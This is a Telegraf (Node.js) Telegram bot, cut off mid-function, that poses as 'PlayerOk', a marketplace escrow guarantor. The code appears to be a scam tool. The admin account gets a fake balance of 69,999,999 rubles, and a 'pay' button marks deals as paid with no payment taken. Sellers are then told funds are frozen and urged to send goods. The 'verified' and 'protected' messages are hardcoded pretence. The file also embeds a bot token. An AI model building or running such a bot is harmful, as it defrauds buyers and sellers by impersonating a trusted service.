const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

const ADMIN_USERNAME = 'k13_way';

// Базы данных в памяти хостинга
const users = {};       // База соответствия юзернейма и chat_id: { 'username': chatId }
const userBalances = {}; // База балансов: { 'username': balance }
const deals = {};       // База активных сделок: { 'id': { ... } }

// Функция логирования пользователей
const logUser = (ctx) => {
  const username = ctx.from.username;
  if (!username) return;
  
  const lowerName = username.toLowerCase();
  users[lowerName] = ctx.chat.id; // Запоминаем ID чата для отправки прямых уведомлений
  
  if (!userBalances[lowerName]) {
    userBalances[lowerName] = (lowerName === ADMIN_USERNAME.toLowerCase()) ? 69999999 : 0;
  }
};

const getWelcomeText = () => {
  return `Добро пожаловать 👋\n\n` +
    `✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n` +
    `🥇 Автоматизированный алгоритм исполнения.\n` +
    `🔎 Скорость, верификация и защита.\n` +
    `💳 Удобный и моментальный вывод средств.\n\n` +
    `• Комиссия сервиса: 1%\n` +
    `• Режим работы системы: 24/7\n` +
    `• Главный модератор: @sw1zyy01\n\n` +
    `🛡️ Выберите нужный раздел ниже:`;
};

const getMainKeyboard = () => {
  return Markup.inlineKeyboard([
    [Markup.button.callback('💳 Баланс', 'menu_balance'), Markup.button.callback('🤝 Создать сделку', 'menu_create')],
    [Markup.button.callback('🛡️ Безопасность', 'menu_safety'), Markup.button.callback('👨‍💻 Поддержка', 'menu_support')]
  ]);
};

bot.start((ctx) => {
  logUser(ctx);
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(getWelcomeText(), getMainKeyboard());
});

// Кнопка: Баланс
bot.action('menu_balance', (ctx) => {
  logUser(ctx);
  const username = ctx.from.username || 'user';
  const balance = userBalances[username.toLowerCase()] || 0;

  const balanceText = 
    `💳 *Личный кабинет пользователя* \`@${username}\`\n\n` +
    `💰 *Баланс:* ${balance.toLocaleString('ru-RU')}.00 руб.\n` +
    `🔒 *Заморожено в сделках:* 0.00 руб.\n\n` +
    `📊 *Статистика профиля:*\n` +
    `• Всего сделок: 0\n` +
    `• Успешных сделок: 0\n` +
    `• Споров/Арбитражей: 0\n\n` +
    `✨ Ваш аккаунт полностью верифицирован системой Гаранта.`;

  return ctx.editMessageText(balanceText, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'to_main')]])
  }).catch(() => {});
});

// Кнопка: Создать сделку (Выбор роли)
bot.action('menu_create', (ctx) => {
  logUser(ctx);
  if (!ctx.from.username) {
    return ctx.answerCbQuery('❌ У вас должен быть публичный @username в настройках TG!', { show_alert: true });
  }
  
  return ctx.editMessageText(`🤝 *Новая сделка PlayerOk*\n\nВыберите вашу роль в этой сделке:`, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard([
      [Markup.button.callback('🛒 Я покупаю', 'create_as_buyer'), Markup.button.callback('📦 Я продаю', 'create_as_seller')],
      [Markup.button.callback('⬅️ Отмена', 'to_main')]
    ])
  }).catch(() => {});
});

// Инициализация шагов создания
bot.action(['create_as_buyer', 'create_as_seller'], (ctx) => {
  const role = ctx.callbackQuery.data === 'create_as_buyer' ? 'buyer' : 'seller';
  const partnerRole = role === 'buyer' ? 'продавца' : 'покупателя';
  
  ctx.session = { role: role, step: 'get_partner' };
  
  return ctx.editMessageText(`👤 Введите **@юзернейм** ${partnerRole}, с кем хотите провести сделку:`, {
    ...Markup.inlineKeyboard([[Markup.button.callback('❌ Отмена', 'to_main')]])
  }).catch(() => {});
});

// Обработка текстового ввода параметров сделки
bot.on('text', async (ctx) => {
  logUser(ctx);
  if (!ctx.session || !ctx.session.step) return;

  const text = ctx.message.text.trim();

  // Шаг 1: Получаем юзернейм партнера
  if (ctx.session.step === 'get_partner') {
    const partner = text.replace('@', '').toLowerCase();
    if (partner.length < 3) return ctx.reply('❌ Введите корректный юзернейм.');
    
    ctx.session.partner = partner;
    ctx.session.step = 'get_title';
    return ctx.reply('📦 Введите название или краткое описание товара/услуги:');
  }

  // Шаг 2: Получаем название товара
  if (ctx.session.step === 'get_title') {
    if (text.length < 2) return ctx.reply('❌ Название слишком короткое.');
    
    ctx.session.title = text;
    ctx.session.step = 'get_price';
    return ctx.reply('💰 Укажите сумму сделки в рублях (введите только число):');
  }

  // Шаг 3: Получаем сумму и отправляем предложение
  if (ctx.session.step === 'get_price') {
    const price = parseFloat(text);
    if (isNaN(price) || price <= 0) return ctx.reply('❌ Введите корректное число больше нуля.');

    const dealId = Math.floor(100000 + Math.random() * 900000);
    const myName = ctx.from.username.toLowerCase();
    
    const seller = ctx.session.role === 'seller' ? myName : ctx.session.partner;
    const buyer = ctx.session.role === 'buyer' ? myName : ctx.session.partner;

    deals[dealId] = {
      id: dealId,
      seller: seller,
      buyer: buyer,
      title: ctx.session.title,
      amount: price,
      status: 'pending'
    };

    ctx.session = {}; // Сброс сессии создателя

    // Текст для создателя
    ctx.replyWithMarkdown(`✅ *Сделка #${dealId} успешно сформирована!*\n\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n👥 *Партнер:* @${deals[dealId].partner = seller === myName ? buyer : seller}\n\nБот пытается отправить сделку вашему партнеру напрямую...`);

    // Автоматическая отправка контрагенту
    const targetUsername = seller === myName ? buyer : seller;
    const targetChatId = users[targetUsername];

    const proposalText = 
      `🔔 *Вам поступило предложение о сделке Гаранта PlayerOk!* (#${dealId})\n\n` +
      `📦 *Товар:* ${deals[dealId].title}\n` +
      `💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n` +
      `👤 *Инициатор:* @${myName}\n\n` +
      `Вы согласны провести данную операцию под защитой торгового маркетплейса?`;

    if (targetChatId) {
      bot.telegram.sendMessage(targetChatId, proposalText, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🤝 Принять сделку', `accept_${dealId}`)],
          [Markup.button.callback('❌ Отклонить', `decline_${dealId}`)]
        ])
      }).catch(() => {});
    } else {
      // Если партнер еще не заходил в бота
      ctx.replyWithMarkdown(`⚠️ Покупатель/Продавец @${targetUsername} еще не активировал этого бота. Перешлите ему ссылку на бота, чтобы он нажал /start и смог подтвердить операцию.`);
    }
  }
});

// Кнопка: Партнер принимает сделку
bot.action(/^accept_(.+)$/, (ctx) => {
  logUser(ctx);
  const dealId = ctx.match;
  const deal = deals[dealId];
  if (!deal) return ctx.answerCbQuery('Сделка не найдена или устарела.');

  deal.status = 'accepted';

  // Ищем чаты участников
  const sellerChat = users[deal.seller];
  const buyerChat = users[deal.buyer];

  const infoText = `🤝 *Сделка #${dealId} принята обеими сторонами!*\n\n📦 *Товар:* ${deal.title}\n💰 *Сумма:* ${deal.amount.toLocaleString('ru-RU')} руб.\n\n`;

  if (buyerChat) {
    bot.telegram.sendMessage(buyerChat, infoText + `🛒 Вам необходимо внести оплату на баланс гаранта PlayerOk для заморозки средств:`, 
      Markup.inlineKeyboard([[Markup.button.callback('💳 Перейти к оплате', `pay_${dealId}`)]])
    ).catch(() => {});
  }

  if (sellerChat && ctx.chat.id !== sellerChat) {
    bot.telegram.sendMessage(sellerChat, infoText + `⏳ Ожидайте, пока покупатель @${deal.buyer} проведет оплату стоимости товара на баланс гаранта.`).catch(() => {});
  }

  return ctx.editMessageText(`✅ Вы приняли условия сделки #${dealId}. Ожидайте дальнейших действий партнера.`).catch(() => {});
});

// Кнопка: Оплата покупателем
bot.action(/^pay_(.+)$/, (ctx) => {
  const dealId = ctx.match;
  const deal = deals[dealId];
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.');

  deal.status = 'paid';

  const sellerChat = users[deal.seller];
  if (sellerChat) {
    bot.telegram.sendMessage(sellerChat, `💰 *Покупатель оплатил сделку #${dealId}!* Средства (${deal.amount} руб) заморожены на балансе PlayerOk.\n\nПередайте товар покупателю @${deal.buyer} и после отправки нажмите кнопку ниже:`, 
      Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dealId}`)]])
    ).catch(() => {});
  }

  return ctx.editMessageText(`✅ *Вы успешно оплатили сделку #${dealId}!* Деньги заморожены гарантом. Ожидайте передачи товара продавцом @${deal.seller}.`).catch(() => {});
});

// Кнопка: Продавец передал товар
bot.action(/^sent_(.+)$/, (ctx) => {
  const dealId = ctx.match;
  const deal = deals[dealId];
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.');

  deal.status = 'goods_sent';

  const buyerChat = users[deal.buyer];
  if (buyerChat) {
    bot.telegram.sendMessage(buyerChat, `📦 *Продавец подтвердил отправку товара по сделке #${dealId}!*\n\nПроверьте полученный товар/услугу. Если все в порядке, подтвердите закрытие сделки, чтобы продавец получил выплату:`, 
      Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', `finish_${dealId}`)]])
    ).catch(() => {});
  }

  return ctx.editMessageText(`✅ Вы отметили товар как отправленный. Ожидаем финального подтверждения от покупателя.`).catch(() => {});
});

// Кнопка: Покупатель закрывает сделку
bot.action(/^finish_(.+)$/, (ctx) => {
  const dealId = ctx.match;
  const deal = deals[dealId];
  if (!deal) return ctx.answerCbQuery('Сделка не найдена.');

  deal.status = 'completed';

  // Виртуальный перевод денег продавцу
  if (userBalances[deal.seller] !== undefined) {
